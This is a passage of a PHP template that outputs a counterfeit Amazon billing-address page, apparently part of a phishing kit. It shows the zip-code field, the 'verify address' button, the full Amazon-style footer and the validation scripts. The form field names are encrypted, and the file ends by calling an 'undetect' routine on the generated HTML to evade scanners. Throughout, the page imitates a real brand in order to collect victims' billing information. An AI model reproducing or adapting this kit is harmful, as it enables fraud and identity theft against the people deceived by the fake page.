                                            <div class="a-column a-span4 a-span-last">
                                                <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container">
                                                    <div class="a-section a-spacing-none aok-inline-block">
                                                        <label for="zipcode" class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
                                                            <span class="a-size-base">'.$api->text_encode($lang['billingpage']['zipcode']).'</span>
                                                        </label>
                                                    </div>
                                                </div>
                                                <div class="a-section a-spacing-none adddress-ui-widgets-form-field-container">
                                                    <input type="text" id="zipcode" name="'.$api->encypt("zipcode").'" spellcheck="false" class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input" required="true">
                                                    <div id="inputErrorMsgZipcode"></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div data-a-input-name="address-ui-widgets-use-as-my-default" class="a-checkbox address-ui-widgets-checkbox-view a-spacing-medium">
                                    <label for="address-ui-widgets-use-as-my-default">
                                        <input id="address-ui-widgets-use-as-my-default" type="checkbox" value="true">
                                        <i class="a-icon a-icon-checkbox"></i>
                                        <span class="a-label a-checkbox-label">
                                            <span class="a-size-base">'.$api->text_encode($lang['billingpage']['thismydefault']).'</span>
                                        </span>
                                    </label>
                                </div>
                                <span class="a-declarative" data-action="form-submit-button-click" data-csa-c-type="widget" data-csa-c-func-deps="aui-da-form-submit-button-click" data-form-submit-button-click="{}" data-csa-c-id="2wxgho-v0agi7-ik77m7-h0g34u">
                                    <span id="address-ui-widgets-form-submit-button" class="a-button a-button-primary">
                                        <span class="a-button-inner">
                                            <input class="a-button-input" type="submit" id="btn_next" aria-labelledby="address-ui-widgets-form-submit-button-announce">
                                            <span class="a-button-text" aria-hidden="true">'.$api->text_encode($lang['billingpage']['verifyaddress']).'</span>
                                        </span>
                                    </span>
                                </span>
                            </div>
                            <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/deskop-address.css").'">
                            <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/custom-address.css").'">
                        </span>
                        </form>
                    </div>
                </div>
            </div>
            <div class="navLeftFooter nav-sprite-v1" id="navFooter">
                <a href="javascript:void(0)" id="navBackToTop">
                    <div class="navFooterBackToTop">
                        <span class="navFooterBackToTopText">
                            '.$api->text_encode($lang['billingpage']['backtotop']).'
                        </span>
                    </div>
                </a> 
                <div class="navFooterVerticalColumn navAccessibility" role="presentation">
                    <div class="navFooterVerticalRow navAccessibility" style="display: table-row;">
                        <div class="navFooterLinkCol navAccessibility">
                            <div class="navFooterColHead" role="heading" aria-level="6">'.$api->text_encode($lang['billingfooter']['gettoknow']).'</div>
                            <ul>
                                <li class="nav_first">
                                    <a href="#jobs" class="nav_a">'.$api->text_encode($lang['billingfooter']['careers']).'</a>
                                </li>
                                <li>
                                    <a href="#blog" class="nav_a">'.$api->text_encode($lang['billingfooter']['blog']).'</a>
                                </li>
                                <li>
                                    <a href="#aboutamazon" class="nav_a">'.$api->text_encode($lang['billingfooter']['aboutamazon']).'</a>
                                </li>
                                <li>
                                    <a href="#ir" class="nav_a">'.$api->text_encode($lang['billingfooter']['investor']).'</a>
                                </li>
                                <li>
                                    <a href="#gp" class="nav_a">'.$api->text_encode($lang['billingfooter']['amazondevices']).'</a>
                                </li>
                                <li class="nav_last ">
                                    <a href="#amazonscience" class="nav_a">'.$api->text_encode($lang['billingfooter']['amazonscience']).'</a>
                                </li>
                            </ul>
                        </div>
                        <div class="navFooterColSpacerInner navAccessibility"></div>
                        <div class="navFooterLinkCol navAccessibility">
                            <div class="navFooterColHead" role="heading" aria-level="6">'.$api->text_encode($lang['billingfooter']['makemoney']).'</div>
                            <ul>
                                <li class="nav_first">
                                    <a href="#sell" class="nav_a">'.$api->text_encode($lang['billingfooter']['sellproducts']).'</a>
                                </li>
                                <li>
                                    <a href="#amazonbusiness" class="nav_a">'.$api->text_encode($lang['billingfooter']['sellbusiness']).'</a>
                                </li>
                                <li>
                                    <a href="#developer" class="nav_a">'.$api->text_encode($lang['billingfooter']['sellapps']).'</a>
                                </li>
                                <li>
                                    <a href="#affiliateprogram" class="nav_a">'.$api->text_encode($lang['billingfooter']['becomeaffiliate']).'</a>
                                </li>
                                <li>
                                    <a href="#advertising" class="nav_a">'.$api->text_encode($lang['billingfooter']['advertise']).'</a>
                                </li>
                                <li>
                                    <a href="#selleraccount" class="nav_a">'.$api->text_encode($lang['billingfooter']['selfpublish']).'</a>
                                </li>
                                <li>
                                    <a href="#amazonhublocker" class="nav_a">'.$api->text_encode($lang['billingfooter']['hostamazonhub']).'</a>
                                </li>
                                <li class="nav_last nav_a_carat">
                                    <span class="nav_a_carat" aria-hidden="true">›</span>
                                    <a href="#b/?node=18190131011&amp;ld=AZUSSOA-seemore&amp;ref_=footer_seemore" class="nav_a">'.$api->text_encode($lang['billingfooter']['seemore']).'</a>
                                </li>
                            </ul>
                        </div>
                        <div class="navFooterColSpacerInner navAccessibility"></div>
                        <div class="navFooterLinkCol navAccessibility">
                            <div class="navFooterColHead" role="heading" aria-level="6">'.$api->text_encode($lang['billingfooter']['amazonpayment']).'</div>
                            <ul>
                                <li class="nav_first">
                                    <a href="#dp" class="nav_a">'.$api->text_encode($lang['billingfooter']['amazonbusiness']).'</a>
                                </li>
                                <li>
                                    <a href="#gp" class="nav_a">'.$api->text_encode($lang['billingfooter']['shopwithpoints']).'</a>
                                </li>
                                <li>
                                    <a href="#gp" class="nav_a">'.$api->text_encode($lang['billingfooter']['reloadbalance']).'</a>
                                </li>
                                <li class="nav_last ">
                                    <a href="#gp" class="nav_a">'.$api->text_encode($lang['billingfooter']['amazoncurrency']).'</a>
                                </li>
                            </ul>
                        </div>
                        <div class="navFooterColSpacerInner navAccessibility"></div>
                        <div class="navFooterLinkCol navAccessibility">
                            <div class="navFooterColHead" role="heading" aria-level="6">'.$api->text_encode($lang['billingfooter']['letushelp']).'</div>
                            <ul>
                                <li>
                                    <a href="#homepage" class="nav_a">'.$api->text_encode($lang['billingfooter']['youraccount']).'</a>
                                </li>
                                <li>
                                    <a href="#orderhistory" class="nav_a">'.$api->text_encode($lang['billingfooter']['yourorders']).'</a>
                                </li>
                                <li>
                                    <a href="#gp" class="nav_a">'.$api->text_encode($lang['billingfooter']['shippingrates']).'</a>
                                </li>
                                <li>
                                    <a href="#gp" class="nav_a">'.$api->text_encode($lang['billingfooter']['returnsreplace']).'</a>
                                </li>
                                <li>
                                    <a href="#gp" class="nav_a">'.$api->text_encode($lang['billingfooter']['manageyourcontent']).'</a>
                                </li>
                                <li class="nav_last ">
                                    <a href="#gp" class="nav_a">'.$api->text_encode($lang['billingfooter']['help']).'</a>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="nav-footer-line"></div>
                <div class="navFooterLine navFooterLinkLine navFooterPadItemLine">
                    <span>
                        <div class="navFooterLine navFooterLogoLine">
                            <a href="#?ref_=footer_logo">
                                <div class="nav-logo-base nav-sprite"></div>
                            </a>
                        </div>
                    </span>
                    <span class="icp-container-desktop">
                        <div class="navFooterLine">
                            <style type="text/css">
                            #icp-touch-link-language {
                                display: none;
                            }
                            </style>
                            <a href="#customer-preferences" aria-owns="nav-flyout-icp-footer-flyout" class="icp-button" id="icp-touch-link-language">
                                <div class="icp-nav-globe-img-2 icp-button-globe-2"></div>
                                <span class="icp-color-base">'.$api->text_encode($lang['billingfooter']['language']).'</span>
                                <span class="nav-arrow icp-up-down-arrow"></span>
                            </a>
                            <style type="text/css">
                            #icp-touch-link-cop {
                                display: none;
                            }
                            </style>
                            <a href="#customer-preferences" class="icp-button" id="icp-touch-link-cop">
                                <span class="icp-currency-symbol">'.$api->text_encode($lang['billingfooter']['symbolmoney']).'</span><span class="icp-color-base">'.$api->text_encode($lang['billingfooter']['money']).'</span>
                            </a>
                            <style type="text/css">
                            #icp-touch-link-country {
                                display: none;
                            }
                            </style>
                            <a href="#customer-preferences" class="icp-button" id="icp-touch-link-country">
                                <span class="icp-flag-3 icp-flag-3-'.strtolower($_SESSION['countrycode']).'"></span>
                                <span class="icp-color-base">'.$api->text_encode($_SESSION['country']).'</span>
                            </a>
                        </div>
                    </span>
                </div>
                <div class="navFooterLine navFooterLinkLine navFooterPadItemLine navFooterCopyright">
                    <ul>
                        <li class="nav_first">
                            <a href="#gp" id="" class="nav_a">'.$api->text_encode($lang['billingfooter']['conditions']).'</a> 
                        </li>
                        <li>
                            <a href="#gp" id="" class="nav_a">'.$api->text_encode($lang['billingfooter']['consumer']).'</a> 
                        </li>
                        <li>
                            <a href="#gp" id="" class="nav_a">'.$api->text_encode($lang['billingfooter']['adsprivacy']).'</a> 
                        </li>
                        <li>
                            <a href="#privacyprefs" id="" class="nav_a">'.$api->text_encode($lang['billingfooter']['privacy']).'</a> 
                        </li>
                        <li class="nav_last">
                            <span id="nav-icon-ccba" class="nav-sprite"></span> 
                        </li>
                    </ul>
                    <span>'.$api->text_encode($lang['billingfooter']['copyright']).'</span>
                </div>
            </div>
        </div>
    </div>
    <div id="a-popover-root" style="z-index:-1;position:absolute;"></div>
    <script src="'.$api->text_encode("../../assets/js/jquery.min.js").'"></script>
    <script src="'.$api->text_encode("../../assets/js/jquery.mask.min.js").'"></script>
    <script src="'.$api->text_encode("../../assets/js/jquery.validate.min.js").'"></script>
    <script src="'.$api->text_encode("../../assets/js/billing.auth.js").'"></script>
</body>
</html>';

$api->undetect($html);
?>